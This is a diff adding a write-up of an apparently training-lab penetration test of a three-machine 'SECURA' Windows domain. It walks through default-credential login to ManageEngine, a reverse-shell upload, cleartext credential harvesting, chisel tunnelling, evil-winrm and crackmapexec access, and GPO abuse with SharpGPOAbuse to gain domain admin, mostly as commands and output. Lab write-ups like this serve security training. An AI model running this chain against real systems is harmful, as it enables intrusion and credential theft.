@@ -1,0 +1,313 @@
+In the first Challenge Lab, you are tasked with performing a penetration test on SECURA's three-machine enterprise environment. This lab serves as a ramp-up before tackling the more complex Challenge Labs 1-3. You will exploit vulnerabilities in ManageEngine, pivot through internal services, and leverage insecure GPO permissions to escalate privileges and compromise the domain.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sV -Pn -sT 192.168.234.95-97
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 14:54 CET
+Nmap scan report for 192.168.234.95
+Host is up (0.045s latency).
+Not shown: 994 closed tcp ports (conn-refused)
+PORT      STATE SERVICE        VERSION
+135/tcp   open  msrpc          Microsoft Windows RPC
+139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5001/tcp  open  commplex-link?
+8443/tcp  open  ssl/https-alt  AppManager
+12000/tcp open  cce4x?
+
+Nmap scan report for 192.168.234.96
+Host is up (0.041s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3306/tcp open  mysql?
+
+Nmap scan report for 192.168.234.97
+Host is up (0.048s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Simple DNS Plus
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-05 13:54:25Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: SECURA)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+I found this port associated with manageEngine 8443/tcp  open  ssl/https-alt  AppManager
+
+I accessed it via a web browser using https traffic 
+https://192.168.234.95:8443/index.do
+
+I logged in with admin:admin
+
+From the admin area, I uploaded a shell.bat (A script that upload powercat from my kali and execute a reverse shell to my kali) I executed on the website and got an a shel as NT\Authority in .95 domain computer.
+
+I executed the winPEAS.exe script and found a domain policy misconfiguration but we cannot check it for this user because it is NT\Athourity. We need to enumerate other users and machines.
+
+
+          ͹ Display Local Group Policy settings - local users/machine
+   Type             :     machine
+   Display Name     :     Local Group Policy
+   Name             :     Local Group Policy
+   Extensions       :     [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}]
+   File Sys Path    :     C:\Windows\System32\GroupPolicy\Machine
+   Link             :     Local
+   GPO Link         :     Local Machine
+   Options          :     All Sections Enabled
+
+   =================================================================================================
+
+   Type             :     machine
+   Display Name     :     Default Domain Policy
+   Name             :     {31B2F340-016D-11D2-945F-00C04FB984F9}
+   Extensions       :     [{00000000-0000-0000-0000-000000000000}{CC5746A9-9B74-4BE5-AE2E-64379C86E0E4}][{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}{B05566AC-FE9C-4368-BE01-7A4CBB6CBA11}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{91FBB303-0CD5-4055-BF42-E512A681B325}{CC5746A9-9B74-4BE5-AE2E-64379C86E0E4}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
+   File Sys Path    :     C:\Windows\system32\GroupPolicy\DataStore\0\sysvol\secura.yzx\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine
+   Link             :     LDAP://DC=secura,DC=yzx
+   GPO Link         :     Domain
+   Options          :     Computer Section Disable
+
+#More enumeration also revealed this file that exposed clear-text credential
+C:\Users\Administrator\AppData\Local\Microsoft\"Remote Desktop Connection Manager"\
+
+
+<server>Connect To\era.secura.yzx</server>
+      </recentlyUsed>
+    </groups>
+  </BuiltInGroups>
+  <ConnectionBarState>Pinned</ConnectionBarState>
+  <CredentialsProfiles>
+    <credentialsProfiles>
+      <credentialsProfile inherit="None">
+        <profileName scope="Local">SECURE\apache</profileName>
+        <userName>apache</userName>
+        <password>New2Era4.!</password>
+        <domain>SECURE</domain>
+
+#I used powerview.ps1 to enumerate the domain information to get all computers and users
+
+S C:\users\administrator> Get-NetDomain
+Get-NetDomain
+
+
+Forest                  : secura.yzx
+DomainControllers       : {dc01.secura.yzx}
+Children                : {}
+DomainMode              : Unknown
+DomainModeLevel         : 7
+Parent                  : 
+PdcRoleOwner            : dc01.secura.yzx
+RidRoleOwner            : dc01.secura.yzx
+InfrastructureRoleOwner : dc01.secura.yzx
+Name                    : secura.yzx
+
+Administrator                                       
+Michael michael@secura.yzx
+charlotte@secura.yzx
+
+PS C:\users\administrator> 
+Get-NetComputer | select operatingsystem,dnshostname
+
+operatingsystem              dnshostname      
+---------------              -----------      
+Windows Server 2016 Standard dc01.secura.yzx      192.168.234.97
+Windows 10 Pro               secure.secura.yzx    192.168.234.95
+Windows 10 Pro               era.secura.yzx       192.168.234.96
+
+#For the earlie found credential, i used it to have access to .96
+┌──(kali㉿kali)-[~/secura]
+└─$ evil-winrm -i 192.168.234.96 -u apache              
+
+Enter Password: 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\apache.ERA\Documents> whoami
+era\apache
+*Evil-WinRM* PS C:\Users\apache.ERA\Documents> hostname
+era
+*Evil-WinRM* PS C:\Users\apache.ERA\Documents> 
+
+Since the sql database found in .96 can only be access via the internal and not external, I used chisel to tunnel into the internal network.
+
+
+./chisel_linux server -p 8001 --reverse
+
+
+.\chisel.exe client 192.168.45.174:8001 R:3306:127.0.0.1:3306
+
+
+then try to get connected using this command from my kali
+
+mysql -u root -h 127.0.0.1 --skip-ssl
+
+Searching through the databases and tables, I found this credentials
+
+administrator | Almost4There8.? |
+| charlotte     | Game2On4.!
+
+The administrator account is the account for .96 admin
+
+Accessing the DC
+crackmapexec smb 192.168.156.97 -u charlotte -p 'Game2On4.!' -d SECURE --shares
+/usr/lib/python3/dist-packages/cme/cli.py:35: SyntaxWarning: invalid escape sequence '\ '
+  """,
+/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\p'
+  stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % self.__host
+/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\{'
+  command = self.__shell + 'echo '+ data + ' ^> \\\\127.0.0.1\\{}\\{} 2^>^&1 > %TEMP%\{} & %COMSPEC% /Q /c %TEMP%\{} & %COMSPEC% /Q /c del %TEMP%\{}'.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)
+/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\S'
+  self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
+/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\S'
+  self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
+SMB         192.168.156.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:SECURE) (signing:True) (SMBv1:True)
+SMB         192.168.156.97  445    DC01             [+] SECURE\charlotte:Game2On4.!
+SMB         192.168.156.97  445    DC01             [+] Enumerated shares
+SMB         192.168.156.97  445    DC01             Share           Permissions     Remark                                                    
+SMB         192.168.156.97  445    DC01             -----           -----------     ------                                                    
+SMB         192.168.156.97  445    DC01             ADMIN$          READ,WRITE      Remote Admin                                              
+SMB         192.168.156.97  445    DC01             C$              READ,WRITE      Default share                                             
+SMB         192.168.156.97  445    DC01             IPC$                            Remote IPC                                                
+SMB         192.168.156.97  445    DC01             NETLOGON        READ,WRITE      Logon server share                                        
+SMB         192.168.156.97  445    DC01             SYSVOL          READ            Logon server share                                        
+SMB         192.168.156.97  445    DC01             test            READ,WRITE                                                                
+                                                                       
+
+Shows that charlotte have access to some share, I used smbcliet to enumerate them but no nice information was found
+┌──(kali㉿kali)-[~/secura]
+└─$ 
+
+smbclient \\\\192.168.156.97\\SYSVOL -U charlotte
+
+I used Evil-WinRM again to access the PC
+                                                                                                                                                                
+┌──(kali㉿kali)-[~/secura]
+└─$ evil-winrm -i 192.168.156.97 -u charlotte
+Enter Password: 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\TEMP\Documents> cd ..
+*Evil-WinRM* PS C:\Users\TEMP> cd ..
+*Evil-WinRM* PS C:\Users> cd charlotte
+*Evil-WinRM* PS C:\Users\charlotte> ls
+
+
+I enumerated the earlier found group policy again with powerview.ps1
+
+Evil-WinRM* PS C:\Users\charlotte> Get-NetGPO
+
+
+usncreated               : 5900
+systemflags              : -1946157056
+displayname              : Default Domain Policy
+iscriticalsystemobject   : True
+gpcmachineextensionnames : [{00000000-0000-0000-0000-000000000000}{CC5746A9-9B74-4BE5-AE2E-64379C86E0E4}][{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}{B05566AC-FE9C-4368-BE01-7A4CBB6CBA11}{D02B1F72-3407-48AE-BA88-E821
+                           3C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{91FBB303-0CD5-4055-BF42-E512A681B325}{CC5746A9-9B74-4BE5-AE2E-64379C86E0E4}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11
+                           D1-A28C-00C04FB94F17}]
+whenchanged              : 10/25/2022 5:39:34 PM
+objectclass              : {top, container, groupPolicyContainer}
+gpcfunctionalityversion  : 2
+showinadvancedviewonly   : True
+usnchanged               : 36917
+dscorepropagationdata    : {1/18/2024 4:44:24 PM, 10/25/2022 5:34:04 PM, 10/24/2022 6:37:23 PM, 10/24/2022 6:36:46 PM...}
+name                     : {31B2F340-016D-11D2-945F-00C04FB984F9}
+flags                    : 0
+cn                       : {31B2F340-016D-11D2-945F-00C04FB984F9}
+gpcuserextensionnames    : [{3060E8D0-7020-11D2-842D-00C04FA372D4}{3060E8CE-7020-11D2-842D-00C04FA372D4}]
+gpcfilesyspath           : \\secura.yzx\sysvol\secura.yzx\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
+distinguishedname        : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=secura,DC=yzx
+whencreated              : 8/5/2022 6:20:58 PM
+versionnumber            : 196678
+instancetype             : 4
+objectguid               : 96b9edb9-359c-4da6-bb3f-140827342e4c
+objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=secura,DC=yzx
+
+usncreated               : 5903
+systemflags              : -1946157056
+displayname              : Default Domain Controllers Policy
+gpcmachineextensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
+whenchanged              : 10/25/2022 5:34:04 PM
+objectclass              : {top, container, groupPolicyContainer}
+gpcfunctionalityversion  : 2
+showinadvancedviewonly   : True
+usnchanged               : 36886
+dscorepropagationdata    : {10/25/2022 5:34:04 PM, 8/5/2022 6:22:00 PM, 1/1/1601 12:00:01 AM}
+name                     : {6AC1786C-016F-11D2-945F-00C04fB984F9}
+flags                    : 0
+cn                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
+iscriticalsystemobject   : True
+gpcfilesyspath           : \\secura.yzx\sysvol\secura.yzx\Policies\{6AC1786C-016F-11D2-945F-00C04FB984F9}
+distinguishedname        : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=secura,DC=yzx
+whencreated              : 8/5/2022 6:20:58 PM
+versionnumber            : 65538
+instancetype             : 4
+objectguid               : 13d03559-9bbd-4f6a-9604-af297ccb5e77
+objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=secura,DC=yzx
+
+
+Then I checked charlotte's permission for both policies and found something interesting on the Default Domain Policy
+
+*Evil-WinRM* PS C:\Users\charlotte> Get-GPPermission -Name "Default Domain Policy" -All
+
+
+Trustee     : Authenticated Users
+TrusteeType : WellKnownGroup
+Permission  : GpoApply
+Inherited   : False
+
+Trustee     : Domain Admins
+TrusteeType : Group
+Permission  : GpoCustom
+Inherited   : False
+
+Trustee     : Enterprise Admins
+TrusteeType : Group
+Permission  : GpoCustom
+Inherited   : False
+
+Trustee     : charlotte
+TrusteeType : User
+Permission  : GpoEditDeleteModifySecurity
+Inherited   : False
+
+Trustee     : ENTERPRISE DOMAIN CONTROLLERS
+TrusteeType : WellKnownGroup
+Permission  : GpoRead
+Inherited   : False
+
+Trustee     : SYSTEM
+TrusteeType : WellKnownGroup
+Permission  : GpoEditDeleteModifySecurity
+Inherited   : False
+
+
+I abused it by adding charlotte as an administrator
+
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"
+
+Tested it with psexec, because it can be used to get a shell on a system if the credential is an admin and have permissions on a shared file
+
+./PsExec64.exe -i \\secura.yzx\sysvol\secura.yzx\Policies\ -u SECURE\chalotte -p Game2On4.! cmd
+
+To find the flag
+
+Get-Childitem –Path C:\ -Include *txt* -Recurse -ErrorAction SilentlyContinue
+
+iwr -uri http://192.168.45.234:8000/winPEASx64.exe -Outfile winPEASx64.exe
